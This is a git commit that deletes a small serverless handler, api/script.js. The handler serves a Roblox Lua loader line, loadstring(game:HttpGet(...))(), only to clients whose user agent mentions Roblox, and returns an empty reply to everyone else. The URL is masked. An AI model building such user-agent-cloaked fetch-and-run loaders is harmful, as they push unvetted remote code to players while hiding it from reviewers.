a0098fcbe1614b42e3e0a9714e8210039b988d55
corex <d4cvsx@gmail.com>
2026-01-27 01:06:27 +0100

    Delete api/script.js

--- api/script.js
+++
@@ -1,9 +0,0 @@
-module.exports = (req, res) => {
-  const ua = req.headers['user-agent'] || '';
-  if (ua.includes('Roblox')) {
-    res.setHeader('Content-Type', 'text/plain');
-    res.end('loadstring(game:HttpGet("xxxxxxxxxxxxxxxx"))()');
-  } else {
-    res.status(204).end();
-  }
-};
